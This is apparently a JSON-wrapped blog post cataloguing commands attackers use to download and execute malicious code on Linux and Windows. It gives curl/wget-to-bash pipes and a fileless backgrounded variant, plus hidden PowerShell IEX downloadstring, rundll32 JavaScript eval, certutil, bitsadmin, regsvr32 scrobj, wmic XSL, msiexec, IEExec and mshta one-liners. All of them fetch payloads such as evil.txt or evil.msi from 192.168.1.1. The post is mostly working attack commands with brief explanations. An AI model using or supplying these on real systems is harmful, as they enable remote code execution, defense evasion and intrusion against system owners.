{"componentChunkName":"component---src-templates-blog-post-js","path":"/blogs/malicious-code-command/","result":{"data":{"site":{"siteMetadata":{"title":"Twistronics Blog"}},"markdownRemark":{"id":"c7780609-d485-5070-86c0-de98eea3a702","excerpt":"In the process of infiltration, attackers often need to download and execute malicious code through commands to implement operations such as information…","html":"<p>In the process of infiltration, attackers often need to download and execute malicious code through commands to implement operations such as information collection, persistence, privilege enhancement, defense bypass, extraction of credentials, lateral movement, and data exfiltration.</p>\n<p>The execution of malicious code on the target host can be divided into uploading/downloading and executing malicious code and fileless remote malicious code execution. Next, let’s summarize some methods of downloading and executing malicious code in Linux and Windows.</p>\n<h2>Linux</h2>\n<h4>curl</h4>\n<p>Execute the shell script on the http page in <code class=\"language-text\">curl</code>, without downloading, directly execute on the local machine.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token function\">bash</span> <span class=\"token operator\">&lt;</span> <span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span> <span class=\"token function\">curl</span> http://192.168.1.1:8000/test.sh  <span class=\"token punctuation\">)</span>\n<span class=\"token function\">curl</span> -fsSL http://192.168.1.1:8000/test.sh <span class=\"token operator\">|</span> <span class=\"token function\">bash</span></code></pre></div>\n<h4>wget</h4>\n<p>Execute the <code class=\"language-text\">wget</code> command to download malicious programs remotely.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token function\">wget</span> -q -O- http://192.168.1.1:8000/test.sh <span class=\"token operator\">|</span> <span class=\"token function\">bash</span>\n<span class=\"token function\">wget</span> http://192.168.1.1:8000/shell.txt -O /tmp/x.php <span class=\"token operator\">&amp;&amp;</span> php /tmp/x.php</code></pre></div>\n<p>Combine <code class=\"language-text\">curl</code>+<code class=\"language-text\">wget</code> to realize fileless remote malicious code execution.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token function\">bash</span> -c <span class=\"token string\">'(curl -fsSL http://192.168.1.1:8000/test.sh||\nwget -q -O- http://192.168.1.1:8000/test.sh)|bash -sh >/dev/null 2>&amp;1&amp;'</span></code></pre></div>\n<h4>rcp</h4>\n<p>The <code class=\"language-text\">rcp</code> command is used to copy remote files or directories.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token function\">rcp</span> username@servername:./testfile testfile</code></pre></div>\n<h4>sftp</h4>\n<p>Use <code class=\"language-text\">sftp</code> to download files on the remote server.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token function\">sftp</span> admin@192.168.1.1 <span class=\"token operator\">&lt;&lt;</span><span class=\"token string\">EOF  \nget  /tmp/1.txt            \nquit \nEOF</span></code></pre></div>\n<h4>scp</h4>\n<p><code class=\"language-text\">scp</code> is an enhanced version of <code class=\"language-text\">rcp</code>, <code class=\"language-text\">scp</code> is encrypted, <code class=\"language-text\">rcp</code> is not encrypted.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token function\">scp</span> username@servername:/path/filename /tmp/local_destination</code></pre></div>\n<h4>rsync</h4>\n<p>Use <code class=\"language-text\">rsync</code> to synchronize remotely and pull files to a local server.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token function\">rsync</span> -av servername:/tmp/passwd.txt  /tmp/passwd.txt</code></pre></div>\n<h2>Windows</h2>\n<h4>Powershell</h4>\n<p>Use powershell to remotely execute ps1 scripts.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\">powershell -nop -w hidden -c <span class=\"token string\">\"IEX <span class=\"token variable\"><span class=\"token punctuation\">((</span>new<span class=\"token operator\">-</span>object net.webclient<span class=\"token punctuation\">)</span>.downloadstring<span class=\"token punctuation\">(</span>'http<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span><span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.1</span><span class=\"token operator\">/</span>evil.txt'<span class=\"token punctuation\">))</span></span>\"</span></code></pre></div>\n<h4>rundll32</h4>\n<p>Using <code class=\"language-text\">rundll32.exe</code>, JavaScript can be executed through <code class=\"language-text\">mshtml.dll</code>, which depends on the <code class=\"language-text\">WScript.shell</code> component</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\">rundll32.exe javascript:<span class=\"token string\">\"\\..\\mshtml,RunHTMLApplication \"</span><span class=\"token punctuation\">;</span>document.write<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token assign-left variable\">h</span><span class=\"token operator\">=</span>new%20ActiveXObject<span class=\"token punctuation\">(</span><span class=\"token string\">\"WinHttp.WinHttpRequest.5.1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>h.Open<span class=\"token punctuation\">(</span><span class=\"token string\">\"GET\"</span>,<span class=\"token string\">\"http://192.168.1.1:8000/connect\"</span>,false<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>try<span class=\"token punctuation\">{</span>h.Send<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token assign-left variable\">b</span><span class=\"token operator\">=</span>h.ResponseText<span class=\"token punctuation\">;</span>eval<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>catch<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>new%20ActiveXObject<span class=\"token punctuation\">(</span><span class=\"token string\">\"WScript.Shell\"</span><span class=\"token punctuation\">)</span>.Run<span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd /c taskkill /f /im rundll32.exe\"</span>,0,true<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span></code></pre></div>\n<h4>bitsadmin</h4>\n<p>Use the <code class=\"language-text\">bitsadmin</code> command to download the file to the target machine.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\">bitsadmin /transfer n http://192.168.1.1/imag/evil.txt d:<span class=\"token punctuation\">\\</span>test.txt</code></pre></div>\n<h4>certutil</h4>\n<p>It is used to back up the certificate service. Generally, it is recommended to delete the cache after downloading the file.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\">certutil -urlcache -split -f http://192.168.1.1/imag/evil.txt test.php\ncertutil -urlcache -split -f http://192.168.1.1/imag/evil.txt delete</code></pre></div>\n<h4>regsvr32</h4>\n<p>Remote load execution, parse the <code class=\"language-text\">.src</code> file.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\">regsvr32.exe /u /n /s /i:http://192.168.1.1:8000/file.sct scrobj.dll</code></pre></div>\n<h4>pubprn.vbs</h4>\n<p>There is a Microsoft signed WSH script named <code class=\"language-text\">pubprn.vbs</code> in Windows 7 and above, which can be used to parse the <code class=\"language-text\">.sct</code> script:</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token string\">\"C:\\Windows\\System32\\Printing_Admin_Scripts<span class=\"token entity\" title=\"\\e\">\\e</span>n\\pubprn.vbs\"</span> <span class=\"token number\">127.0</span>.0.1 script:https://servername/test.sct</code></pre></div>\n<h4>wmic</h4>\n<p>Execute the following <code class=\"language-text\">WMIC</code> command to download and run the malicious XSL file from the remote server:</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\">wmic os get /FORMAT:<span class=\"token string\">\"http://192.168.1.1/evil.xsl\"</span></code></pre></div>\n<h4>msiexec</h4>\n<p>It is used to install the Windows Installer installation package and can execute the msi file remotely.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\">msiexec /q /i http://192.168.1.1/evil.msi</code></pre></div>\n<h4>msxsl</h4>\n<p><code class=\"language-text\">msxsl.exe</code> is a program used by Microsoft to process XSL under the command line</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\">msxsl http://192.168.1.1/scripts/demo.xml http://192.168.1.1/scripts/exec.xsl</code></pre></div>\n<h4>IEExec</h4>\n<p>The <code class=\"language-text\">IEexec.exe</code> application is a program that comes with the .NET Framework. Run <code class=\"language-text\">IEExec.exe</code> and use url to start other programs.</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\">crosoft.NET<span class=\"token punctuation\">\\</span>Framework64<span class=\"token punctuation\">\\</span>v2.0.5072<span class=\"token operator\"><span class=\"token file-descriptor important\">7</span>></span>caspol.exe -s off\nC:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Microsoft.NET<span class=\"token punctuation\">\\</span>Framework64<span class=\"token punctuation\">\\</span>v2.0.5072<span class=\"token operator\"><span class=\"token file-descriptor important\">7</span>></span>IEExec.exe http://192.168.1.1/evil.exe</code></pre></div>\n<h4>mshta</h4>\n<p><code class=\"language-text\">mshta</code> is used to execute <code class=\"language-text\">.hta</code> files</p>\n<div class=\"gatsby-highlight\" data-language=\"shell\"><pre class=\"language-shell\"><code class=\"language-shell\">mshta http://192.168.1.1/run.hta</code></pre></div>","frontmatter":{"title":"Several methods to download and execute malicious code through command","date":"January 03, 2018","description":"The execution of malicious code on the target host can be divided into uploading/downloading and executing malicious code and fileless remote malicious code execution. Next, let's summarize some methods of downloading and executing malicious code in Linux and Windows.","tags":["Shell","Cybersecurity","Penetration test"]}}},"pageContext":{"slug":"/blogs/malicious-code-command/","previous":{"fields":{"slug":"/blogs/synonymous-sentences-detection/"},"frontmatter":{"title":"Synonymous Sentences Detection"}},"next":{"fields":{"slug":"/blogs/CVE-2020-5410/"},"frontmatter":{"title":"Spring Cloud Config Server directory traversal vulnerability CVE-2020-5410"}}}}}